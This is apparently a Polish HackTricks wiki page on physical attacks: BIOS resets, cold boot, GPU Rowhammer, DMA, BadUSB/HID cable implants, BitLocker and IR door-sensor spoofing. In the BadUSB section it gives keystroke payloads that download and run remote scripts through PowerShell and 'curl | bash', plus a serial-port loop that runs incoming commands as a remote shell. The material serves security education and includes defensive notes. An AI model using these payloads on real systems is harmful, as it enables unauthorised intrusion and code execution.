# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

## Odzyskiwanie hasła BIOS-u i bezpieczeństwo systemu

Ustawienia starszego firmware'u PC można zresetować, odłączając baterię CMOS lub używając opisanego w dokumentacji zworkowego resetu CMOS. Wymagany czas odłączenia zasilania zależy od płyty głównej, a hasła lub klucze nowoczesnego UEFI mogą być przechowywane w pamięci flash nieulotnej, kontrolerze wbudowanym lub urządzeniu zabezpieczającym, dlatego mogą przetrwać wyjęcie baterii. Przed zwieraniem pinów zapoznaj się z instrukcją płyty głównej lub serwisową; ta procedura może również unieważnić pomiary TPM i spowodować konieczność odzyskiwania szyfrowania dysku.

W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą sprawdzać lub modyfikować ustawienia przechowywane w CMOS z poziomu środowiska rozruchowego. CmosPwd rozpoznaje formaty haseł z udokumentowanego zestawu starszych rodzin BIOS-u i może tworzyć kopie zapasowe, przywracać lub usuwać/zerować stan CMOS; opublikowane kompilacje są przeznaczone dla starszych środowisk DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Te narzędzia nie są uniwersalnymi programami do usuwania haseł UEFI i wymagają odpowiedniego dostępu do sprzętu/firmware'u.

W niektórych laptopach firmware wyświetla specyficzny dla producenta kod wyzwania po kilku nieudanych próbach podania hasła. Bazy danych takie jak [bios-pw.org](https://bios-pw.org) mogą wyznaczyć starsze hasła odzyskiwania producenta dla niektórych modeli, ale wiele systemów stosuje blokadę bez możliwości wyznaczenia hasła na podstawie kodu wyzwania. Traktuj każde wygenerowane hasło jako zależne od modelu i unikaj wyczerpania liczników prób, których nie można zresetować.

### Zabezpieczenia UEFI

W nowoczesnych systemach **UEFI** CHIPSEC może przeprowadzić audyt zabezpieczeń zmiennych Secure Boot. Zacznij od poniższego testu, który nie modyfikuje systemu; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i należy go używać wyłącznie w systemie laboratoryjnym, który można odzyskać. CHIPSEC ostrzega, że jego uprzywilejowany sterownik i niskopoziomowy dostęp do sprzętu nie nadają się do użycia na produkcyjnych urządzeniach końcowych.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM i ataki Cold Boot

Pamięć DRAM nie traci natychmiast wszystkich bitów po ustaniu odświeżania. Tempo zanikania danych znacznie różni się w zależności od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż cykl wyłączenia i ponownego uruchomienia bez chłodzenia. Atak cold-boot polega na szybkim ponownym uruchomieniu systemu do niewielkiego środowiska akwizycji danych lub przeniesieniu schłodzonego modułu, przechwyceniu surowej pamięci i odtworzeniu kluczy kryptograficznych mimo zanikania bitów. Narzędzie do kopiowania dysków nie jest automatycznie narzędziem do obrazowania pamięci fizycznej, a Volatility analizuje zrzut, zamiast go pozyskiwać; użyj odpowiedniego dla platformy, sprawdzonego narzędzia akwizycji.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer wymierzony w tablice stron

Współczesne ataki GPU Rowhammer stają się znacznie skuteczniejsze, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Ostatnie badania nad **kartami NVIDIA Ampere z pamięcią GDDR6** pokazują, że atakujący uruchamiający nieuprzywilejowany kod CUDA może tworzyć wzorce hammeringu specyficzne dla GPU, użyć **memory massaging**, aby umieścić struktury stronicowania w podatnych wierszach, a następnie przełączać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do przejęcia hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Schemat wykorzystania

1. **Profiluj podatne na hammering wiersze** w pamięci GDDR6 i twórz wzorce hammeringu uwzględniające odświeżanie lub niejednolite wzorce, które omijają zabezpieczenia wbudowane w DRAM.
2. **Manipuluj alokacjami GPU**, aby sterownik umieszczał struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast pozostawiać je w domyślnej, chronionej puli. W praktyce może to oznaczać wyczerpanie obszaru tablic stron w pamięci niskiej oraz rozrzucenie dużych, rzadkich mapowań UVM z kontrolowanymi odstępami.
3. **Przełączaj bity w metadanych translacji**, takich jak **PFN** lub bity związane z aperturą, we wpisie tablicy stron lub katalogu stron, aby kontrolowana przez atakującego strona wirtualna wskazywała na strony tablic stron, dowolną pamięć GPU lub mapowania systemowe widoczne dla hosta.
4. Wykorzystaj sfałszowane mapowanie do modyfikowania kolejnych wpisów translacji i uzyskania **dowolnego odczytu/zapisu pamięci GPU** w różnych kontekstach GPU.

### Przejście na hosta i zabezpieczenia

- Przy **wyłączonym IOMMU** sfałszowane mapowania apertury systemowej mogą udostępnić GPU dowolną **pamięć fizyczną hosta**, zmieniając prymityw GPU w pełne przejęcie hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** atakuje wpisy tablicy stron ostatniego poziomu, podczas gdy **GeForge** pokazuje, że łatwiejsze może być uszkodzenie poziomu katalogu stron, ponieważ przełączenie jednego bitu może zmienić cel większego poddrzewa translacji. Nie traktuj tylko jednej warstwy stronicowania jako krytycznej z punktu widzenia bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę do dowolnej pamięci hosta wykorzystywaną przez GDDRHammer/GeForge, ale **nie stanowi pełnego zabezpieczenia**. **GPUBreach** pokazuje drugi etap ataku, w którym atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci sterownika NVIDIA, uzyskując możliwość zapisu do jądra i **powłokę root** nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
- **ECC na poziomie systemu** to praktyczne wzmocnienie zabezpieczeń na obsługiwanych kartach GPU do stacji roboczych i serwerów. Konsumenckie karty GPU bez ECC mają słabszy zakres ochrony.<sup>[[4]](#references)</sup>
- Ataki te nie są czysto teoretyczne: **GeForge** zgłosił **1 171** przełączeń bitów na karcie RTX 3060 i **202** na karcie RTX A6000, co wystarczyło do zbudowania działającego łańcucha eskalacji uprawnień do hosta.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataki Direct Memory Access (DMA)

Informacje o patchowaniu UEFI IFR/NVRAM w trybie offline, które może osłabić egzekwowanie IOMMU przed uruchomieniem systemu i umożliwić atak DMA w systemie Windows, znajdziesz tutaj:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstruje pozyskiwanie i modyfikowanie pamięci za pomocą **DMA** przez interfejsy takie jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest po prostu „nieskuteczny wobec Windows 10”: możliwość wykorzystania zależy od interfejsu, kompilacji systemu, zasad IOMMU, stanu blokady oraz tego, czy funkcja Windows Kernel DMA Protection jest obsługiwana i włączona. Windows 10 w wersji 1803 i nowszych wprowadził Kernel DMA Protection na zgodnych platformach, znacząco zmieniając powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB umożliwiające dostęp do systemu

W przypadku niezaszyfrowanego woluminu Windows lub woluminu, który został już odblokowany, środowisko offline może zastąpić pliki binarne ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, uzyskując wiersz polecenia SYSTEM po użyciu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą edytować dane lokalnych kont SAM. Metody te nie omijają blokady zaszyfrowanego woluminu BitLocker i mogą uszkodzić poświadczenia chronione przez DPAPI/EFS; zachowaj kopie kryminalistyczne i kopie zapasowe.

**Kon-Boot** to komercyjne narzędzie do omijania uwierzytelniania podczas uruchamiania, obsługujące wybrane konfiguracje Windows/macOS. Zgodność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje zablokowanego woluminu BitLocker.<sup>[[10]](#references)</sup>

---

## Obsługa funkcji bezpieczeństwa Windows

### Skróty uruchamiania i odzyskiwania

- **Delete/Supr**, F2, F10 lub inny klawisz producenta może otworzyć konfigurację firmware.
- **F8** uruchamia starsze zaawansowane opcje rozruchu systemu Windows tylko w konfiguracjach, w których ta ścieżka jest nadal włączona; sposób uruchamiania bieżącego środowiska odzyskiwania jest różny.
- Przytrzymanie klawisza **Shift** może wyłączyć automatyczne logowanie Windows w niektórych konfiguracjach, choć ustawienia zasad/rejestru mogą to zachowanie wyłączyć.<sup>[[17]](#references)</sup>

### Urządzenia BAD USB

Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wprowadzać z góry określone sekwencje klawiszy. Payload początkowo ma uprawnienia i dostęp do pulpitu sesji zalogowanego użytkownika; ograniczają go nadal monity UAC, blokada ekranu, układ klawiatury, czas wykonania i zasady USB obowiązujące na urządzeniu końcowym.<sup>[[15]](#references)</sup>

Programowalne urządzenia peryferyjne mogą również atakować parsery jądra hosta i koordynować działanie kilku urządzeń USB w celu groomingu sterty i ujawnienia informacji:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Uprawnienia administratora lub kopii zapasowej pozwalają utworzyć kopię w tle albo zapisać ule rejestru, dzięki czemu można pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika zbierania danych po przejęciu systemu, a nie omijania kontroli uprawnień; należy ją korelować ze zdarzeniami `diskshadow`/VSS i eksportu uli rejestru.

## Techniki implantów BadUSB / HID

### Urządzenie HID Androida uruchamiane przez NFC

Zrootowany telefon z Androidem może działać jako programowalna klawiatura USB tylko wtedy, gdy jego kontroler USB i jądro obsługują **USB gadget/HID**. Na zgodnych urządzeniach Kali NetHunter udostępnia profile gadget przez **USB Arsenal**. Inną opcją jest [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), które tworzy funkcje gadget ConfigFS i może udostępniać urządzenia znakowe klawiatury/myszy, takie jak `/dev/hidg0` i `/dev/hidg1`. Narzędzie tworzy tylko punkt końcowy gadget; osobny proces musi zapisywać do niego raporty HID. Dostęp root nie zastąpi jądra, w którym brakuje ConfigFS, obsługi HID gadget lub użytecznego USB Device Controller.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ten punkt końcowy można połączyć z NFC w Androidzie, które pełni funkcję fizycznego wyzwalacza. Aplikacja [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) odczytuje UID tagu, konwertuje go do oczekiwanej postaci, sprawdza lokalną listę dozwolonych wartości i po znalezieniu dopasowania wysyła skonfigurowaną sekwencję klawiszy w stylu Rubber Ducky. Podłączony host widzi zwykłe dane wejściowe z klawiatury i nie wymaga oprogramowania NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Przed użyciem skrótów lub poleceń sprawdź enumerację urządzenia i układ klawiatury w pustym edytorze tekstu. Nieszkodliwy payload to:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Ważne granice zaufania:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **Lista dozwolonych UID służy do identyfikacji, a nie uwierzytelniania**. UID są publiczne, a niektóre typy tokenów lub emulatory pozwalają je sklonować albo podszyć się pod nie. Skopiowany dozwolony UID podlega tej samej ścieżce obsługi co oryginalny token.
- Moduł Magisk **NfcScreenOff** modyfikuje usługę NFC, by zachowywała się tak, jakby ekran był włączony, a telefon odblokowany. Jeśli telefon jest już podłączony do hosta, ktoś może w ten sposób uruchomić payload bez odblokowywania telefonu.
- Hasła, tokeny API i polecenia zapisane w payloadzie to możliwe do odzyskania sekrety na urządzeniu z dostępem root lub odblokowanym bootloaderem. Wpisywanie hasła przez HID to automatyzacja wykorzystująca wielokrotnie hasło, a nie uwierzytelnianie bezhasłowe.
- Wstrzykiwanie HID działa z uprawnieniami aktywnego pulpitu i zależy od fokusu, czasu oraz układu klawiatury hosta. Przed wykonaniem wrażliwych działań wymagaj niedawnego potwierdzenia użytkownika, unikaj umieszczania uprzywilejowanych sekretów w skryptach i używaj kryptograficznego uwierzytelniacza opartego na mechanizmie challenge-response do prawdziwego uwierzytelniania.

### Implanty kablowe Wi-Fi

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się wewnątrz kabli USB-A→USB-C lub USB-C↔USB-C, zgłaszają się wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
- Interfejs w przeglądarce udostępnia karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloady są oznaczane według systemu operacyjnego, układy klawiatury można przełączać na bieżąco, a ciągi VID/PID można zmieniać, by naśladować znane urządzenia peryferyjne.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotowywać payloady, uruchamiać je i zarządzać danymi logowania do Wi-Fi bez korzystania z sieci organizacji — przydatne podczas krótkotrwałego fizycznego wtargnięcia.

### Payloady AutoExec rozpoznające system operacyjny

- Reguły AutoExec przypisują jeden lub więcej payloadów do natychmiastowego uruchomienia po enumeracji USB. Implant wykonuje podstawowe rozpoznanie systemu operacyjnego i wybiera pasujący skrypt.
- Przykładowy przebieg:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie odbywa się bez nadzoru, sama wymiana kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Zdalna powłoka przez Wi-Fi TCP uruchamiana za pomocą HID

1. **Bootstrap za pomocą naciśnięć klawiszy:** Zapisany payload otwiera konsolę i wkleja pętlę, która wykonuje wszystko, co nadejdzie przez nowe urządzenie szeregowe USB. Minimalny wariant dla Windows to:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Most kablowy:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Pythona, APK na Androida lub aplikację desktopową), który łączy się z operatorem. Wszystkie bajty wpisane w sesji TCP są przekazywane do powyższej pętli szeregowej, co umożliwia zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Ilość danych wyjściowych jest ograniczona, dlatego operatorzy zwykle uruchamiają polecenia bez podglądu wyników (tworzenie kont, przygotowywanie dodatkowych narzędzi itp.).

### Powierzchnia aktualizacji HTTP OTA

- Udokumentowany interfejs Evil Crow Cable Wind udostępnia nieuwierzytelniony endpoint aktualizacji firmware’u pod adresem `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operatorzy terenowi mogą wymieniać funkcje w locie (np. wgrywać firmware USB Army Knife) w trakcie operacji, bez otwierania kabla, dzięki czemu implant może uzyskać nowe możliwości, pozostając podłączony do hosta docelowego.

## Omijanie szyfrowania BitLocker

Autoryzowane pozyskanie danych kryminalistycznych z działającego lub niedawno uruchomionego systemu może ujawnić klucz główny woluminu BitLocker lub powiązany materiał kluczowy, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale nie ma gwarancji powodzenia. Nowoczesne systemy Windows szyfrują również zrzuty awaryjne, gdy włączony jest BitLocker, a zapisane 48-cyfrowe hasło odzyskiwania to inny artefakt niż klucz woluminu przechowywany w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Inżynieria społeczna w celu dodania klucza odzyskiwania

Atakujący, który nakłoni administratora do uruchomienia poleceń do zarządzania BitLockerem, może dodać hasło odzyskiwania, klucz zewnętrzny lub inny mechanizm ochrony, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem samych zer: numeryczne hasła odzyskiwania BitLockera muszą mieć prawidłowy 48-cyfrowy format. Odpowiednia składnia do autoryzowanego zarządzania to `manage-bde -protectors -add C: -recoverypassword`; listę dodanych mechanizmów ochrony można wyświetlić za pomocą `manage-bde -protectors -get C:`. Monitoruj dodawanie mechanizmów ochrony i upewnij się, że nowy materiał odzyskiwania jest przechowywany wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>

---

## Wykorzystywanie przełączników otwarcia obudowy / konserwacji do przywracania ustawień fabrycznych BIOS-u

Wiele nowoczesnych laptopów i komputerów stacjonarnych o niewielkich rozmiarach ma **przełącznik otwarcia obudowy**, monitorowany przez Embedded Controller (EC) oraz firmware BIOS/UEFI. Choć głównym zadaniem przełącznika jest generowanie alertu po otwarciu urządzenia, niektórzy producenci implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu go w określonym wzorcu.<sup>[[5]](#references)[[6]](#references)</sup>

### Jak działa atak

1. Przełącznik jest podłączony do **przerwania GPIO** w EC.
2. Firmware działający na EC śledzi **czas i liczbę naciśnięć**.
3. Po rozpoznaniu zakodowanego na stałe wzorca EC uruchamia procedurę *mainboard-reset*, która **kasuje zawartość systemowej pamięci NVRAM/CMOS**.
4. Przy następnym uruchomieniu systemu modele, których to dotyczy, wczytują zresetowany stan firmware’u. Zależnie od producenta i wersji, wyczyszczony stan może obejmować hasło nadzorcy, niestandardowe ustawienia rozruchu lub zarejestrowane klucze Secure Boot; stan TPM i wpływ na szyfrowanie dysku należy ocenić osobno.

> Reset firmware’u może przywrócić opcje rozruchu z nośników zewnętrznych, ale **nie** odszyfrowuje pamięci masowej. Po zmianach w TPM lub firmware BitLocker albo inny system pełnego szyfrowania dysku może zażądać odzyskiwania, nadal chroniąc dysk wewnętrzny, jeśli nie ma klucza odzyskiwania.<sup>[[16]](#references)</sup>

### Przykład z rzeczywistego świata – laptop Framework 13

Skrót odzyskiwania w laptopie Framework 13 (11., 12. lub 13. generacji) działa następująco:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Po dziesiątym cyklu EC ustawia flagę nakazującą BIOS-owi wyczyszczenie NVRAM przy następnym ponownym uruchomieniu. Cała procedura trwa około 40 s i wymaga **jedynie śrubokręta**.<sup>[[5]](#references)</sup>

### Ogólna procedura wykorzystania podatności

1. Włącz lub uśpij i wybudź urządzenie docelowe, aby EC działał.
2. Zdejmij dolną pokrywę, aby uzyskać dostęp do przełącznika wykrywania otwarcia obudowy/serwisowego.
3. Odtwórz wzorzec przełączeń właściwy dla danego producenta (sprawdź dokumentację i fora albo przeprowadź inżynierię wsteczną firmware’u EC).
4. Złóż urządzenie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware’u i dane uwierzytelniające faktycznie uległy zmianie.
5. Jeśli masz upoważnienie i możliwe jest uruchomienie z nośnika zewnętrznego, uruchom kontrolowany obraz live. Gdy wewnętrzny wolumin zostanie legalnie odblokowany (lub jeśli nigdy nie był szyfrowany), środowisko live może pozyskać dane uwierzytelniające i dane lub sprawdzić EFI System Partition. Modyfikacja tej partycji w celu zainstalowania implantu EFI jest trwała i wysoce inwazyjna, a ponadto ograniczają ją Secure Boot, measured boot, ochrona firmware’u przed zapisem i monitorowanie urządzeń końcowych. Zaszyfrowane dane pozostają niedostępne bez klucza lub materiału odzyskiwania.

### Wykrywanie i ograniczanie ryzyka

* Rejestruj zdarzenia otwarcia obudowy w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS-u.
* Stosuj **plomby wskazujące naruszenie**, umieszczane na śrubach i pokrywach, aby wykrywać otwarcie.
* Przechowuj urządzenia w **fizycznie kontrolowanych miejscach**; zakładaj, że fizyczny dostęp oznacza pełne przejęcie urządzenia.
* Jeśli to możliwe, wyłącz funkcję producenta „resetu przełącznikiem serwisowym” lub wymagaj dodatkowego uwierzytelnienia kryptograficznego przy resetowaniu NVRAM.

---

## Ukryte wstrzykiwanie sygnału IR w czujnikach wyjściowych bezdotykowych

### Charakterystyka czujnika
- Popularne czujniki „wave-to-exit” łączą emiter diody LED bliskiej podczerwieni z odbiornikiem podobnym do stosowanych w pilotach do telewizorów, który zgłasza stan wysoki na wyjściu logicznym dopiero po wykryciu kilku impulsów (~4–10) o odpowiedniej częstotliwości nośnej (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastikowa osłona uniemożliwia bezpośrednie wzajemne widzenie się emitera i odbiornika, więc kontroler zakłada, że każdy zweryfikowany sygnał nośny pochodzi od pobliskiego odbicia, i uruchamia przekaźnik otwierający elektrozaczep drzwi.
- Gdy kontroler uzna, że w pobliżu znajduje się cel, często zmienia obwiednię modulacji sygnału wyjściowego, ale odbiornik nadal akceptuje każdy impuls zgodny z filtrowaną częstotliwością nośną.

### Przebieg ataku
1. **Zarejestruj profil emisji** – podłącz analizator logiczny do styków kontrolera, aby zarejestrować przebiegi przed wykryciem i po nim, które sterują wewnętrzną diodą LED IR.
2. **Odtwarzaj wyłącznie przebieg „po wykryciu”** – usuń lub zignoruj fabryczny emiter i od początku steruj zewnętrzną diodą LED IR wzorcem odpowiadającym stanowi po wykryciu. Ponieważ odbiornik zwraca uwagę wyłącznie na liczbę impulsów i częstotliwość, uznaje sfałszowany sygnał nośny za prawdziwe odbicie i aktywuje linię przekaźnika.
3. **Steruj czasem nadawania** – wysyłaj sygnał nośny w dostrojonych seriach (np. włączony przez kilkadziesiąt milisekund, potem podobnie długo wyłączony), aby uzyskać minimalną liczbę impulsów bez nasycania układu AGC odbiornika ani uruchamiania logiki obsługi zakłóceń. Ciągła emisja szybko zmniejsza czułość czujnika i uniemożliwia zadziałanie przekaźnika.

### Odbiciowe wstrzykiwanie sygnału z dużej odległości
- Zastąpienie diody LED ze stanowiska testowego mocną diodą IR, sterownikiem MOSFET i optyką skupiającą pozwala niezawodnie wyzwalać czujnik z odległości około 6 m.
- Atakujący nie musi mieć bezpośredniej widoczności apertury odbiornika; skierowanie wiązki na ściany wewnątrz pomieszczenia, regały lub framugi drzwi widoczne przez szybę pozwala odbitej energii wpaść w pole widzenia o kącie około 30° i naśladować machnięcie ręką z bliska.
- Ponieważ odbiorniki są przystosowane do wykrywania jedynie słabych odbić, znacznie silniejsza wiązka zewnętrzna może odbijać się od kilku powierzchni i nadal przekraczać próg detekcji.

### Zmodyfikowana latarka do ataku
- Ukrycie sterownika wewnątrz zwykłej latarki pozwala zamaskować narzędzie. Zastąp widoczną diodę LED mocną diodą IR dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania impulsów ≈30 kHz i użyj MOSFET-a do odprowadzania prądu diody LED.
- Teleskopowy obiektyw z regulowanym zoomem zawęża wiązkę, zwiększając zasięg i precyzję, a silnik wibracyjny sterowany przez MCU zapewnia haptyczne potwierdzenie aktywnej modulacji bez emitowania widzialnego światła.
- Przełączanie między kilkoma zapisanymi wzorcami modulacji (nieznacznie różniącymi się częstotliwościami nośnymi i obwiedniami) zwiększa zgodność z różnymi, przemianowanymi rodzinami czujników, pozwalając operatorowi omiatać powierzchnie odbijające, aż przekaźnik kliknie i drzwi się otworzą.

---

## References

- [1] [GDDRHammer: znaczne zakłócanie wierszy DRAM — ataki Rowhammer między komponentami z użyciem współczesnych GPU](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: ataki na pamięć GDDR w celu fałszowania tablic stron GPU — dla zabawy i zysku](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: ataki eskalacji uprawnień na GPU z użyciem Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA — komunikat dotyczący bezpieczeństwa: Rowhammer — lipiec 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners — „Framework 13. Naciśnij tutaj, aby przejąć urządzenie”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki — przewodnik resetowania płyty głównej](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost — „Nieee, bez dotykania! Omijanie czujników wyjściowych IR bezdotykowych za pomocą ukrytej latarki IR”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker — „Podłącz, uruchom, przejmij: hakowanie za pomocą Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier — atak Rowhammer na układy NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Oficjalna dokumentacja Kon-Boot i informacje o zgodności](https://kon-boot.com/)
- [11] [Dokumentacja CHIPSEC — zabezpieczenia zmiennych Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Póki pamięć nie zgaśnie: ataki typu cold boot na klucze szyfrujące](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception — manipulowanie pamięcią fizyczną przez DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn — ochrona Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentacja Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn — przewodnik po operacjach BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn — zachowanie automatycznego logowania po przytrzymaniu klawisza Shift](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity — dokumentacja i pliki do pobrania CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Dokumentacja Kali Linux — NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Dokumentacja jądra Linux — sterownik gadżetu USB HID](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [Narzędzie USB Gadget](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Jak zmienić zrootowany telefon z Androidem w uwierzytelniacz NFC i narzędzie do automatyzacji komputera](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
